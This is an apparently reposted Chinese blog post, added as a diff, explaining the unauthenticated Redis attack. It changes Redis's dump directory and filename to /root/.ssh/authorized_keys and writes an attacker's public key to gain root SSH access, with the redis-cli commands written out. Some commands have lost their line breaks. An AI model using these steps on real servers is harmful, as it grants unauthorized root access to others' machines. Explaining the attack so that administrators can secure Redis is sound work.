@@ -1,0 +1,103 @@
+
+---
+layout: post
+title: web实战开发--利用redis漏洞 Hacker对方机器的
+categories:
+- 今日头条
+tags:
+---
+				前言:
+
+服务器端的安全问题, 以前有所耳闻, 听得最多的就是DDOS攻击, 还有就是缓冲区溢出攻击.
+
+但是对通过Redis服务的安全漏洞, 从而绕过验证, 登陆对方机器, 这算是第一次耳闻.
+
+今天趁此机会, 来谈一下, hacker对方机器的原理是什么?
+
+![](http://p3.pstatp.com/large/97000015f03064144c2)
+
+linux的信任机制:
+
+做个互联网运维的工程师, 需要维护众多的机器, 如果每个命令都需要输入的密码的话. 那会非常的崩溃, 于是乎, 安全的免密码登陆方案便如同雨后春笋, 层出不穷.
+
+其中配置信任关系的方案, 成了很多工程师的首选.
+
+那信任关系是什么东东?
+
+linux登陆时通过ssh协议, 来实现的, 但其通过配置RSA(ssh-genkey, ssh-copy-id)密钥对, 来实现免密码登陆.
+
+具体操作:
+
+1. 机器A生成公钥(空密码)
+
+![](http://p3.pstatp.com/large/96c0001597f49e13e9c)
+
+cat id_rsa.pub | ssh root@<ip> -x "cat >> /root/.ssh/authorized_keys"
+
+3. 用户可以从机器A自由登陆到机器B
+
+ssh root@<ip>
+
+
+
+redis基础和管理命令:
+
+redis号称世上最的强大数据结构服务器, 但其数据是可以持久化到本地的.
+
+其数据以database的概念来存储的, 从linux的角度来看, database的集合为一个数据主目录, 而具体的database则以一个数据文件存在.
+
+数据库目录: config get dir.
+
+DB文件: config get dbfilename.
+
+![](http://p3.pstatp.com/large/7fd0009f18886979772)
+
+在redis交互中, 执行如下命令:
+
+flushdbset hello worldsave
+
+则cat dump.rdb文件内容后, 如下所示.
+
+![](http://p3.pstatp.com/large/970000151a61fd2ed1e)
+
+
+
+redis漏洞:
+
+redis服务, 其没有配置任何安全措施, 同时以root账号运行. 那么任何人都能使用该redis服务.
+
+1. 没有设置密码访问
+
+2. bind于0.0.0.0:6379, 暴露于
+
+3. root账号运行该redis服务
+
+![](http://p3.pstatp.com/large/97000015f920ba2cebb)
+
+在这个前提下, 攻击开始了.
+
+hacker使用redis-cli, 或者其他工具, 连上redis服务.
+
+1. 修改db的目录和文件名, 覆盖信任文件
+
+redis:6379> config set dir /root/.sshredis:6379> config set dbfilename "authorized_keys"
+
+2. 设置key/value值, 把秘钥写入
+
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > val.txtcat val.txt | redis-cli -h <ip> -x set
+
+3. 保存持久化
+
+redis:6379> save
+
+这样, 就简单的把hacker的信任秘钥写入到目标机器的/root/.ssh/authorized_keys文件上了.
+
+这样就等价于, 最上面的免秘钥登陆设置. hacker只要简单的一个ssh登陆, 既达到了它的目标, 实在是完美.
+
+
+
+后记:
+
+有安全问题不可怕, 就怕知道漏洞, 还不去解决并修复它, 抱着侥幸心理, 永远是不行的.
+
+本系列, 将讲述作者在使用和维护redis过程中, 一些心得, 希望和大家一起分享, 一起成长.
